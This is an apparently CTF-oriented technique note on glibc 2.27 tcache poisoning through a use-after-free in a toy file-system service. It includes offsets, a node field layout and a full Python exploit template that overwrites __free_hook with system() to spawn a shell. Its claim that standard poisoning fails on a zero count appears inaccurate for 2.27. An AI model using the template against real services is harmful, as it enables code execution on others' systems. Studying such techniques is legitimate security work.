# UAF + Tcache Count Corruption (glibc 2.27)

## Technique Overview

When you have a UAF where content is freed but the node/pointer stays, and you can write to the freed chunk, you can corrupt the tcache fd pointer to create a **count/fd mismatch** — the tcache count stays high but the chain is shortened, allowing allocation at arbitrary addresses.

## Standard Tcache Poisoning Problem

Normal tcache poisoning:
1. Free chunk A → tcache count=1, head=A, A->fd=0
2. UAF write to A: A->fd = target
3. Allocate → returns A, head=target, count=0
4. **Can't allocate target because count=0!**

## Solution: Tcache Count Corruption

Free MULTIPLE chunks, then UAF write to the one at the HEAD:

```
1. Free chunks f0, f1, f2, f3, f4 (filler) → tcache count=5
   Chain: f4 → f3 → f2 → f1 → f0
2. Free UAF target f5 → tcache count=6
   Chain: f5 → f4 → f3 → f2 → f1 → f0
3. UAF write to f5: f5->fd = __free_hook
   Chain: f5 → __free_hook (f4,f3,f2,f1,f0 DISCONNECTED!)
   Count still = 6 (but chain only has 2 entries!)
4. Allocate drain0 → returns f5, head=__free_hook, count=5
5. Allocate pwn → returns __free_hook, count=4
6. Write system() to __free_hook!
```

**Key insight**: The tcache count is maintained separately in `tcache_perthread_struct`. When UAF overwrites fd, the chain gets shorter but count doesn't decrease. This creates a mismatch where you can reach the target with count > 0.

## Minimal Version (2 chunks)

```
1. Free f0 → count=1
2. Free f1 (UAF target) → count=2, chain: f1→f0
3. UAF write to f1: f1->fd = __free_hook
   Chain: f1→__free_hook, count=2
4. Drain: alloc returns f1, head=__free_hook, count=1
5. Alloc returns __free_hook! Write system()!
```

## Node/Content Overlap for Arbitrary Write

When content chunk size == node chunk size (both 0xb0):

```
1. Create file A, write 0xa8 bytes → content = 0xb0 chunk
2. rm A from outside CWD → content freed to tcache[0xb0], node stays
3. Create file B → B_node = malloc(0xa8) = A's content chunk!
4. A's content and B's node are the SAME memory
5. UAF echo to A: writes to B's node fields
   - Can set B->content to any address (offset 0x98)
   - Can set B->content_size to any value (offset 0xa0)
6. Echo to B: write_to_file(B, data, len) writes to B->content
```

### Field Layout (0xa8 byte node)

| Offset | Size | Field |
|--------|------|-------|
| 0x00 | 4+4 | type + padding |
| 0x08 | 8 | parent pointer |
| 0x10-0x8F | 128 | children[16] |
| 0x90 | 8 | name pointer |
| 0x98 | 8 | content pointer |
| 0xA0 | 4+4 | content_size + padding |

### Critical: UAF Write Size Matters

| Write Size | Overwrites | Name Preserved? |
|-----------|-----------|----------------|
| 0x90 bytes | type, parent, children | YES (name at 0x90 untouched) |
| 0x98 bytes | + name | NO (name overwritten) |
| 0xA0 bytes | + content | NO |
| 0xA8 bytes | + content_size | NO (all fields controlled) |

**When writing 0xa8 bytes**: Must set name to a valid address for get_node to find the file.

### PIE .dynstr "n\0" Trick

When you need to set name to a valid address containing "n\0" but don't know heap addresses:

The PIE `.dynstr` section contains "n\0" at offset **0x0569** (from symbol name terminators like `strlen\0`).

```python
n_str_addr = pie_base + 0x0569  # "n\0" in .dynstr
# Set name = n_str_addr in UAF write payload
# get_node("n") → strcmp(n_str_addr, "n") → match!
```

This works because `.dynstr` is in the R E LOAD segment which is always mapped.

## Exploit Template (glibc 2.27, Full RELRO, PIE)

```python
import struct

SYSTEM_OFF = 0x4f440       # from libc
FREE_HOOK_OFF = 0x3ed8e8   # from libc

def exploit(conn, libc_base):
    fh = libc_base + FREE_HOOK_OFF
    sc = libc_base + SYSTEM_OFF
    
    # 1. Setup: create 2 files with 8-byte content (0x20 chunks)
    mkdir(conn, 'a')
    cd(conn, 'a')
    touch(conn, 'f0'); echo(conn, b'A'*8, 'f0')
    touch(conn, 'f1'); echo(conn, b'B'*8, 'f1')
    cd(conn, '..')
    
    # 2. Free both (UAF on f1)
    rm(conn, 'a/f0')  # tcache count=1
    rm(conn, 'a/f1')  # tcache count=2, UAF!
    
    # 3. Poison tcache fd
    echo(conn, struct.pack('<Q', fh), 'a/f1')  # f1->fd = __free_hook
    
    # 4. Drain first entry
    touch(conn, 'd')
    echo(conn, b'JUNK'*2, 'd')  # alloc f1, head=__free_hook, count=1
    
    # 5. Allocate at __free_hook, write system
    touch(conn, 'p')
    echo(conn, struct.pack('<Q', sc), 'p')  # __free_hook = system
    
    # 6. Trigger shell
    touch(conn, 's')
    echo_raw(conn, b'/bin/sh\x00', 's')
    rm(conn, 's')  # free → system("/bin/sh")
```

## Pitfalls

| Problem | Cause | Fix |
|---------|-------|-----|
| Wrong libc base → SIGSEGV | Writing to unmapped __free_hook | Need libc leak first |
| Brute-force causes server ban | Too many crashes → rate limit | Wait between attempts, or find leak |
| echo 'n' only prints user input | sysbuf always contains what you typed | NOT a read primitive |
| check() rejects non-printable bytes | Heap/libc addresses have 0x00, 0x7f, etc. | Cannot leak through ls names directly |
| Corrupting sysbuf_ptr → crash on next cmd | All commands read into sysbuf | Don't corrupt sysbuf unless no more cmds needed |
| UAF write 0xa8 bytes → name pointer invalid | name overwritten to 0 | Set name = PIE .dynstr "n\0" address |
| content_size = 0 → free(target) on echo | First write triggers free+malloc path | Set content_size in UAF payload first |

## When NOT to Use This

- **glibc >= 2.29**: tcache has `key` field for double-free detection. Need different approach.
- **No UAF on freed chunk**: If you can only free but not write to freed memory, can't poison fd.
- **Chunk size not in tcache range** (> 0x408): Goes to unsorted bin, different exploitation.
